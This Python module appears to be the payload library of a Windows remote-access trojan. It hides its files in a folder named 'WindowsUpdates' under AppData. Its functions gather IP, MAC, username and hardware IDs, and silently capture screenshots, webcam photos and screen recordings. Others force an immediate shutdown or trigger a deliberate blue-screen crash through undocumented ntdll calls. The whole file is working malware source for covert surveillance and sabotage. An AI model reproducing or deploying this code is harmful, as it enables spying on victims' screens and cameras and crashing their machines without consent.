import os
from shutil import copy
from PIL import ImageGrab
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref


import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio

operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
nullptr = POINTER(c_int)()

def pc_info():
  ip = os.popen("ipconfig | findstr IPv4").read()
  hostname = os.popen("hostname").read()
  username = os.popen("whoami").read()
  os_version = os.popen("ver").read()
  mac = os.popen("getmac").read()
  return f"IP: {ip}\nMAC: {mac}\nHostname: {hostname}\nUsername: {username}\nOS Version: {os_version}"

def pc_shutdown():
  os.popen("shutdown /s /t 0")

def hardware_info():
  hwid = os.popen("wmic csproduct get uuid").read()
  cpu = os.popen("wmic cpu get name").read()
  gpu = os.popen("wmic path win32_VideoController get name").read()
  ram = os.popen("wmic MemoryChip get Capacity").read()
  return f"HWID: {hwid}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}"

def screenshot():
  ImageGrab.grab().save(f"{operation_dir}\\screenshot.png")
  return f"{operation_dir}\\screenshot.png"

def webcamshot():
  pygame.camera.init()
  cameras = pygame.camera.list_cameras()

  if not cameras:
    return "No camera found."

  camera = pygame.camera.Camera(cameras[0])
  camera.start()
  time.sleep(1)
  img = camera.get_image()
  camera.stop()
  pygame.image.save(img, f"{operation_dir}\\webcamshot.png")
  return f"{operation_dir}\\webcamshot.png"

def sc_rec():
  out = f"{operation_dir}\\screenrecording.mp4"
  s_w, s_h = pyautogui.size()
  s_r = (0, 0, s_w, s_h)
  frames = []
  length = 15
  fps = 60
  num_frames = length * fps
  st_t = time.time()

  for i in range (num_frames):
    img = pyautogui.screenshot(region=s_r)
    frame = np.array(img)
    frames.append(frame)

  imageio.mimsave(out, frames, fps=fps)
  return out


def bsod():
  windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

  windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)